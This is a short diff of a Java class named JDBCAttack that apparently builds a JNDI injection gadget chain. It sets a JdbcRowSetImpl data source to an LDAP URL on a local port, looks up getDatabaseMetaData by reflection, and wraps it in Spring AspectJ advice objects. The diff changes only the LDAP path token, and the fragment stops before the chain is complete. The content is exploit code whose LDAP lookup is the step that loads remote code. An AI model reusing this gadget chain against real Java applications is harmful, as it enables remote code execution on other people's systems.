@@ -12,7 +12,7 @@ public class JDBCAttack {
     public static void main(String[] args) throws Exception {
 
         JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
-        jdbcRowSet.setDataSourceName("ldap://127.0.0.1:50389/8a1660");
+        jdbcRowSet.setDataSourceName("ldap://127.0.0.1:50389/7e0def");
         Method method=jdbcRowSet.getClass().getMethod("getDatabaseMetaData");
         SingletonAspectInstanceFactory factory = new SingletonAspectInstanceFactory(jdbcRowSet);
         AspectJAroundAdvice advice = new AspectJAroundAdvice(method,new AspectJExpressionPointcut(),factory);
